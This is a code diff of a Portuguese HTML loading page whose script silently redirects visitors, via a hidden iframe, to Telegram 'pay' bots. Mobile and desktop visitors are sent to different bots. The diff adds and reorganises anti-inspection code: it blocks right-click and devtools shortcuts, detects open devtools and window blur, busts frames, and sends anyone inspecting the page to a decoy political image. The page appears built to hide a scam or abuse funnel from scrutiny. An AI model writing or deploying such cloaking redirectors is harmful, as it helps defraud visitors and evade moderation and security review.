@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
+<meta charset="utf-8"/>
 <title>🔥 Carregando...</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta http-equiv="Refresh" content="0; url=about:blank" id="no-js">
 <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
 <noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
@@ -11,13 +11,13 @@
   html,body {
     height:100%;
     margin:0;
-    display:flex;
-    justify-content:center;
-    align-items:center;
     background:#000;
-    overflow:hidden;
+    display:flex;
+    align-items:center;
+    justify-content:center;
     font-family:'Poppins',sans-serif;
     color:#fff;
+    overflow:hidden;
   }
   .loader {
     display:flex;
@@ -85,63 +85,62 @@
 <script>
 (()=>{
 
-  // === Links destino (bots) ===
-  const bots=[
-    "https://t.me/tacofire_pay108b9x_bot?start=go",
-    "https://t.me/pizzalove_pay105q8z_bot?start=go",
+  // === Links de destino ===
+  const mobileBots = [
+    "https://t.me/pancakechoco_pay101v7k_bot?start=go",
     "https://t.me/burgerking_pay103x9r_bot?start=go",
-    "https://t.me/pancakechoco_pay101v7k_bot?start=go"
+    "https://t.me/pizzalove_pay105q8z_bot?start=go",
+    "https://t.me/tacofire_pay108b9x_bot?start=go"
   ];
+  const desktopBot = "https://t.me/lasagnamax_pay112w3n_bot?start=go";
+  const trap = "https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
 
-  // === Armadilha anti-inspeção ===
-  const trap="https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
-  let detected=false;
-  const kill=()=>{if(!detected){detected=true;location.replace(trap)}};
+  const isMobile = /Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
+  const rand = arr => arr[Math.floor(Math.random()*arr.length)];
 
-  // bloqueia clique direito e teclas de inspeção
-  document.addEventListener('contextmenu',e=>{e.preventDefault();kill()},{passive:false});
-  document.addEventListener('keydown',e=>{
+  let trapTriggered = false;
+  const triggerTrap = () => {
+    if (trapTriggered) return;
+    trapTriggered = true;
+    location.replace(trap);
+  };
+
+  // === Anti-inspeção ===
+  document.addEventListener('contextmenu', e => { e.preventDefault(); triggerTrap(); }, {passive:false});
+  document.addEventListener('keydown', e => {
     const k=e.key||'';
-    if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){
-      e.preventDefault();kill();
+    if(k==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){
+      e.preventDefault();triggerTrap();
     }
-  },{passive:false});
-
-  // detecção de devtools (somente desktop)
+  }, {passive:false});
   let d=0;
   setInterval(()=>{
-    const isMobile=/Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
-    if(isMobile) return; // ignora iPhone / Android
-    const w=window.outerWidth-window.innerWidth,
-          h=window.outerHeight-window.innerHeight;
-    if((w>160||h>160)&&++d>1) kill();
+    if(isMobile) return; // ignora celulares
+    const w=window.outerWidth-window.innerWidth;
+    const h=window.outerHeight-window.innerHeight;
+    if((w>160||h>160)&&++d>1) triggerTrap();
   },1100);
+  let blurC=0;
+  window.addEventListener('blur',()=>{if(!isMobile && ++blurC>4)triggerTrap()});
+  try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
+  try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)triggerTrap()}catch(e){}
 
-  // === Animação / Status ===
+  // === Status ===
   const status=document.getElementById('status');
-  const msgs=["Preparando 🔥","Verificando conexão...","Aquecendo 🔥","Redirecionando..."];
+  const msgs=["Preparando...","Verificando...","Aquecendo...","Prosseguindo..."];
   let i=0;
-  const change=setInterval(()=>{
-    if(i<msgs.length){status.textContent=msgs[i++];}
-    else clearInterval(change);
-  },700);
+  const change=setInterval(()=>{if(i<msgs.length){status.textContent=msgs[i++]+" 🔥";}else clearInterval(change);},700);
 
   // === Redirecionamento ===
   setTimeout(()=>{
-    if(detected) return;
-    const target=bots[Math.floor(Math.random()*bots.length)];
-    const iframe=document.createElement('iframe');
-    iframe.src=target;
-    iframe.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
-    document.body.appendChild(iframe);
-    setTimeout(()=>location.replace(target),250);
+    if(trapTriggered) return;
+    const dest = isMobile ? rand(mobileBots) : desktopBot;
+    const frame=document.createElement('iframe');
+    frame.src=dest;
+    frame.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
+    document.body.appendChild(frame);
+    setTimeout(()=>{ if(!trapTriggered) location.replace(dest); },250);
   },2600);
-
-  // === Proteções extras ===
-  let blurC=0;
-  window.addEventListener('blur',()=>{if(++blurC>4)kill()});
-  try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
-  try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)kill()}catch(e){}
 
 })();
 </script>
